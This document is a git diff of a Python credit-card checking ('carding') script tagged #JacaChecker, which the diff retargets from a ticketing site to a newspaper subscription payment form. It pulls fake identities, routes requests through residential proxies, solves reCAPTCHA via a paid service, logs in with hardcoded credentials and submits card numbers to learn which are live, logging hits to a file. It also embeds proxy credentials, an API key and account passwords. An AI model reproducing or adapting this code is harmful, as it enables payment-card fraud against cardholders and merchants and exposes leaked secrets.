@@ -24,8 +24,8 @@ def criarTask():
         "clientKey": "5e8c9e3e72aa7154ea2682f577243fbd",
         "task": {
             "type": "RecaptchaV2TaskProxyless",
-            "websiteURL": "https://heralddispatch.newzware.com/ss70v2/gazette/common/template.jsp?remclear=Y",
-            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
+            "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
+            "websiteKey": "6Lcb5mcaAAAAAOOmjTu_EvLbKXpFw8xBO-jDg0Sf",
         },
     }
     criar = requests.post(
@@ -95,224 +95,207 @@ def definir_tipo_cartao(card):
     
     
 def checker(card, month, year, cvv):
-        
-        
-        
+    
+    try:    
+        start_time = time.time()  
+        url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
+        headers = {
+                'Host': 'randomuser.me',
+                'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
+                'accept': 'application/json, text/plain, */*',
+                'sec-ch-ua-mobile': '?0',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
+                'sec-ch-ua-platform': '"Windows"',
+                'origin': 'https://namso-gen.com',
+                'sec-fetch-site': 'cross-site',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://namso-gen.com/',
+                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
+                }
 
-            
-        try:
-            
+        response = requests.get( url, headers=headers, verify=False)
+        email = pegarItem(response.text, '"email":"','"')
+        nome = pegarItem(response.text, '"first":"','"')
+        sobrenome = pegarItem(response.text, '"last":"','"')
+        street = pegarItem(response.text, '"name":"','"},"city"')
+        snumber = pegarItem(response.text, '"street":{"number":',',')
+        city = pegarItem(response.text, '"city":"','"')
+        state = pegarItem(response.text, '"state":"','"')
+        state = state[0:2]
+        postcode = pegarItem(response.text, '"postcode":',',')
+        company = pegarItem(response.text, '"username":"','"')
+        tel = random.randint(1111,9999)
+        tel2 = random.randint(111,999)
+        tel3 = random.randint(111,999)
+        time.sleep(2)
         
+        if response.status_code == 200:
+            time.sleep(5)
+            p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado-country-us:6f2jb118cxl2@brd.superproxy.io:22225'}
+            start_time = time.time() 
 
-            #p = {'http': 'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-privado:6f2jb118cxl2:gh5fkkxopi4c@brd.superproxy.io:22225'}
-            url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
+
+            url = "https://everettweb.newzware.com/newzlib/jsp/ci/login_check_jso.jsp"
+
+            payload = "&site=sound&login_id=jacaccbot%40gmail.com&password=radask10&referrer=&masterL=&masterP=null"
             headers = {
-                    'Host': 'randomuser.me',
-                    'sec-ch-ua': '"Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"',
-                    'accept': 'application/json, text/plain, */*',
-                    'sec-ch-ua-mobile': '?0',
-                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
-                    'sec-ch-ua-platform': '"Windows"',
-                    'origin': 'https://namso-gen.com',
-                    'sec-fetch-site': 'cross-site',
-                    'sec-fetch-mode': 'cors',
-                    'sec-fetch-dest': 'empty',
-                    'referer': 'https://namso-gen.com/',
-                    'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
-                    }
+                'Host': 'everettweb.newzware.com',
+                'Cookie': 'nwssmcookie=ssm; nwssmapptype=S',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'accept': '*/*',
+                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+                'x-requested-with': 'XMLHttpRequest',
+                'sec-ch-ua-mobile': '?0',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'sec-ch-ua-platform': '"Windows"',
+                'origin': 'https://everettweb.newzware.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
+                'accept-language': 'pt-PT,pt;q=0.9'
+                }
 
-            response = requests.get( url, headers=headers, verify=False)
-            email = pegarItem(response.text, '"email":"','"')
-            nome = pegarItem(response.text, '"first":"','"')
-            sobrenome = pegarItem(response.text, '"last":"','"')
-            street = pegarItem(response.text, '"name":"','"},"city"')
-            snumber = pegarItem(response.text, '"street":{"number":',',')
-            city = pegarItem(response.text, '"city":"','"')
-            state = pegarItem(response.text, '"state":"','"')
-            postcode = pegarItem(response.text, '"postcode":',',')
-            company = pegarItem(response.text, '"username":"','"')
-            tel = random.randint(00000,99999)
-            
-   
-          
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+            sessao = response.headers.get('JSESSIONID')
 
-            
-            if response.status_code == 200:
+
+            url = "https://everettweb.newzware.com/ss70v2/common/login.jsp"
+
+            payload = "login_id=jacaccbot%40gmail.com&hash=c59dbf4b7a1fef9a88f2c98d9d805cab&site=sound&encrypted=Y&nwmodule=&nwpage=&rate_id=&remember=N&reverse_remember_me=N&nwregistered="
+            headers = {
+            'Host': 'everettweb.newzware.com',
+            'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'upgrade-insecure-requests': '1',
+            'origin': 'https://everettweb.newzware.com',
+            'content-type': 'application/x-www-form-urlencoded',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
+            'accept-language': 'pt-PT,pt;q=0.9'
+            }
+
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+            sessao = response.headers.get('JSESSIONID')
+
+            recap = criarTask()
+
+            url = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"
+
+            payload = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"
+            headers = {
+            'Host': 'everettweb.newzware.com',
+            'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
+            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+            'sec-ch-ua-mobile': '?0',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+            'sec-ch-ua-platform': '"Windows"',
+            'accept': '*/*',
+            'origin': 'https://everettweb.newzware.com',
+            'sec-fetch-site': 'same-origin',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
+            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp?site=sound&nwmodule=subscribers&nwpage=gift&giftAccount=90411139&login_id=jacaccbot%40gmail.com&lname=PESRES',
+            'accept-language': 'pt-PT,pt;q=0.9',
+            'Content-Type': 'text/plain'
+            }
+
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+            time.sleep(4)
                 
-                p = {'https': 'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225', 'http':'http://brd-customer-hl_b12cf4ef-zone-rdpremium-country-us:qj77tznsi49h@brd.superproxy.io:22225'}
-                start_time = time.time() 
+                    
+                    
 
-    
-            # if len(year) == 4:
-            #     year = year[2:]
- 
- 
- 
-            url = "https://www.brownpapertickets.com/index.html"
-            payload = {}
-            headers = {
-            'Host': 'www.brownpapertickets.com',
-            'Cache-Control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'Upgrade-Insecure-Requests': '1',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Sec-Fetch-Dest': 'document',
-            'Referer': 'https://www.brownpapertickets.com/checkout.html',
-            'Accept-Language': 'pt-PT,pt;q=0.9',
-            #'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; client_secure="8nPuHrcJEZDRs7W"; _gat_UA-114148720-1=1; bpt="nAGY.nAGYgMDK-1712790582730"; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790582.24.0.0; _ga=GA1.1.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790582.0.0.0'
-            }
-
-            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p, timeout=200)
-            email_id = pegarItem(response.text, '<INPUT TYPE="email" NAME="','" VALUE="Email or login"')
-            password = pegarItem(response.text, '<INPUT TYPE="password" NAME="','"')
-            bpt = response.cookies.get('bpt')
-            client_secure = response.headers.get('client_secure')
-            print(bpt)
-
-
-
-            url = "https://www.brownpapertickets.com/login.html"
-            payload = f'{email_id}=suor_jose2daislv%40gmail.com&not_a_valid_field=Password&{password}=radask10'
-            headers = {
-                'Host': 'www.brownpapertickets.com',
-                'Cache-Control': 'max-age=0',
-                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'Upgrade-Insecure-Requests': '1',
-                'Origin': 'https://www.brownpapertickets.com',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Sec-Fetch-Dest': 'document',
-                'Referer': 'https://www.brownpapertickets.com/index.html',
-                'Accept-Language': 'pt-PT,pt;q=0.9',
-                'Cookie': f'allow_cookies="yes"; _gcl_au=1.1.1224439006.1712786777; _gid=GA1.2.950426332.1712786778; _fbp=fb.1.1712786778151.1002254645; _pin_unauth=dWlkPU1UbGpPVGs0TnpndE5qaGlZeTAwWXpJM0xXSTFNekF0WmpSa1pXUXlaVGRtTVdRdw; language="en_GB"; locale="en_GB"; _gat_UA-114148720-1=1; client_secure="CEZzL2De6JDbXn3"; bpt={bpt}; _ga_J4R614QWT5=GS1.1.1712786777.1.1.1712790394.38.0.0; _ga=GA1.2.1494828109.1712786777; _ga_W3XK1HZ6LH=GS1.1.1712786777.1.1.1712790400.0.0.0',
-                'Content-Type': 'application/x-www-form-urlencoded'
-                }
-
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=200)
-            
-            
-      
-
-
-            url = "https://www.brownpapertickets.com/bulk/shippinginfo.html"
-            payload = 'submitted=1&country=United%20States&shipping_type=p&fname=Jose&lname=Silva&address=23937%20Rancho%20Ct&city=Valencia&state=CA&province=&zip=91354&email=jacaccbot%40gmail.com&phone=6612147345'
-            headers = {
-            'Host': 'www.brownpapertickets.com',
-            'Cache-Control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'Upgrade-Insecure-Requests': '1',
-            'Origin': 'https://www.brownpapertickets.com',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'Sec-Fetch-Site': 'same-origin',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-User': '?1',
-            'Sec-Fetch-Dest': 'document',
-            'Referer': 'https://www.brownpapertickets.com/bulk/shippinginfo.html',
-            'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-            'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _gid=GA1.2.1366341742.1712632269; bpt="nAGY.nAGYSJ3h-1712849785279"; language="en_US"; locale="en_US"; _gat_UA-114148720-1=1; client_secure="3rCnMpnAPs2xiky"; _ga_J4R614QWT5=GS1.1.1712852197.15.1.1712853334.15.0.0; _ga=GA1.1.2130983608.1712348265; _derived_epik=dj0yJnU9cmdJRjcyelZKWVBzTW0xUjUycWZaamlKbTZRdTRrMkMmbj1kbWtUcVFyY1JCSDlpZ0pkUHRxTVZ3Jm09MSZ0PUFBQUFBR1lZRVZnJnJtPTEmcnQ9QUFBQUFHWVlFVmcmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712852197.15.1.1712853354.0.0.0',
-            'Content-Type': 'application/x-www-form-urlencoded'
-            }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p, timeout=200)
-
-    
- 
-
- 
-            url = "https://www.brownpapertickets.com/bulk/billinginfo.html"
-            payload = f'submitted=1&browserinfo=24.false.1080.1920&type=Visa&number={card}&month={month}&year={year}&code=789&fname=Jose&lname=Silva&address=23937%20Rancho%20Ct&city=Valencia&state=CA&province=&zip=91354&country=United%20States&terms=t'
-            headers = {
-                'Host': 'www.brownpapertickets.com',
-                'Cache-Control': 'max-age=0',
-                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-                'sec-ch-ua-mobile': '?0',
-                'sec-ch-ua-platform': '"Windows"',
-                'Upgrade-Insecure-Requests': '1',
-                'Origin': 'https://www.brownpapertickets.com',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Sec-Fetch-Site': 'same-origin',
-                'Sec-Fetch-Mode': 'navigate',
-                'Sec-Fetch-User': '?1',
-                'Sec-Fetch-Dest': 'document',
-                'Referer': 'https://www.brownpapertickets.com/bulk/billinginfo.html',
-                'Accept-Language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
-                'Cookie': 'allow_cookies="yes"; _gcl_au=1.1.2103056734.1712348265; _fbp=fb.1.1712348264986.1138458721; _pin_unauth=dWlkPVl6RTFNREk1Wm1ZdE9HVTRZeTAwTnpkakxUbGlOell0Tm1VMVlURm1Nemt3TVRSaA; __utma=138453216.2130983608.1712348265.1712441874.1712441874.1; __utmz=138453216.1712441874.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _gid=GA1.2.1366341742.1712632269; bpt="nAGY.nAGYSJ3h-1712849785279"; language="en_US"; locale="en_US"; client_secure="3rCnMpnAPs2xiky"; _ga_J4R614QWT5=GS1.1.1712852197.15.1.1712853356.60.0.0; _ga=GA1.2.2130983608.1712348265; _derived_epik=dj0yJnU9Y3B0SERWbW43TWZMQVhUVmdPTXlMbEtfS1pwaHkwNWUmbj1UamJyX3dNRFNmQmUtSkV1dWM4VHR3Jm09MSZ0PUFBQUFBR1lZRVcwJnJtPTEmcnQ9QUFBQUFHWVlFVzAmc3A9Mg; _ga_W3XK1HZ6LH=GS1.1.1712852197.15.1.1712853376.0.0.0',
-                'Content-Type': 'application/x-www-form-urlencoded'
-                }
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, allow_redirects=False, proxies=p, timeout=200)
-
-            
-            if "Redirection" in response.text:
-                raise RequisicaoException()
- 
-            
             elapsed_time = time.time() - start_time
             
-            MSegundos = round(elapsed_time, 2) #[{MSegundos} Ms]
-
-
-                
-                    
-            if 'Invalid transaction' in response.text:
-                #code = response.json()['issuerResponseDetails']['issuerResponseCode']
+            MSegundos = round(elapsed_time, 2)
+            
+            if 'adress' in response.text:
                 bin = api_bin(card[:6])              
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos} Ms]"                          
-                open("brownpapertickets.txt", "a").write(f"{card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos} Ms] #JacaChecker\n") 
-                print(Fore.GREEN + f"{x} #JacaChecker")  
-                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}    
-                
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
+                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
+                print(Fore.GREEN + f"{x} #JacaChecker")     
+                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
+            
             elif 'Insufficient funds' in response.text:
                 bin = api_bin(card[:6])              
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos} Ms] "                          
-                open("brownpapertickets.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos} Ms] #JacaChecker\n") 
-                print(Fore.GREEN + f"{x} #JacaChecker")  
-                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos}] MS"                          
+                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
+                print(Fore.GREEN + f"{x} #JacaChecker") 
+                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                
+            elif 'Unidentifiable error issuer generated' in response.text:
+                bin = api_bin(card[:6])              
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos}] MS"                          
+                open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
+                print(Fore.GREEN + f"{x} #JacaChecker") 
+                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                    
+            elif 'expired' in response.text:  
+                bin = api_bin(card[:6])
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card Expired [{MSegundos}] MS"     
+                print(Fore.RED + f"{x} #JacaChecker")  
+                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
+                                        
+            elif 'The specified account was not found' in response.text:  
+                bin = api_bin(card[:6])
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Not Found [{MSegundos}] MS"     
+                print(Fore.RED + f"{x} #JacaChecker")  
+                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
+                
+            elif 'The account number failed to pass the LUHN' in response.text:  
+                bin = api_bin(card[:6])
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Invalid Card [{MSegundos}] MS"     
+                print(Fore.RED + f"{x} #JacaChecker")  
+                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                
+            elif 'Do not honor' in response.text:  
+                bin = api_bin(card[:6])
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Do Not Honor [{MSegundos}] MS"     
+                print(Fore.RED + f"{x} #JacaChecker")  
+                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                
+            elif 'Issuer has flagged this account as fraudulent' in response.text:  
+                bin = api_bin(card[:6])
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Suspected Fraud [{MSegundos}] MS"     
+                print(Fore.RED + f"{x} #JacaChecker")  
+                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                
+            elif 'Card has been restricted' in response.text:  
+                bin = api_bin(card[:6])
+                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card has been restricted [{MSegundos}] MS"     
+                print(Fore.RED + f"{x} #JacaChecker")  
+                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                
+            else:
+                
+                print(Fore.RED + 'Gateway Timeout' + response.text)
+                return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                 
 
-                    
-            elif 'The error returned by the credit card processor was' in response.text:
-                response = pegarItem(response.text, 'The error returned by the credit card processor was:<BR><BR><CENTER>','</CENTER><BR><BR>')
-                bin = api_bin(card[:6])
-                x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: {response} [{MSegundos} Ms]"     
-                print(Fore.RED + f"{x} #JacaChecker")  
-                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}                        
-
-            else:
-            # print(Fore.LIGHTBLACK_EX + f"RETESTANDO: {x} #JacaChecker")    
-                print(Fore.RED + 'Gateway Timeout' + [{MSegundos}] )
-                return {"code": 1, "mensagem": f"Gateway Timeout [{MSegundos} Ms] #JacaChecker<br>"} 
-                    
-
-                        
-
-                    
-        except requests.exceptions.ProxyError:
-            print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
-        except requests.exceptions.ConnectionError:
-            print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
-        except requests.exceptions.RequestException:
-            print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
-        except RequisicaoException:
-            print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
-            reteste(card, month, year, cvv)
             
+    except requests.exceptions.ProxyError:
+        print(Fore.LIGHTWHITE_EX + f"RETESTANDO PROXY: {card}|{month}|{year}|{cvv}")
+        reteste(card, month, year, cvv)
+        
+    except requests.exceptions.ConnectionError:
+        print(Fore.LIGHTWHITE_EX + f"RETESTANDO ConnectionError: {card}|{month}|{year}|{cvv}")
+        reteste(card, month, year, cvv)
+    except requests.exceptions.RequestException:
+        print(Fore.LIGHTWHITE_EX + f"RETESTANDO RequestException: {card}|{month}|{year}|{cvv}")
+        reteste(card, month, year, cvv)
+    except RequisicaoException:
+        print(Fore.LIGHTWHITE_EX + f"RETESTANDO Location: {card}|{month}|{year}|{cvv}")
+        reteste(card, month, year, cvv)
             
 
 
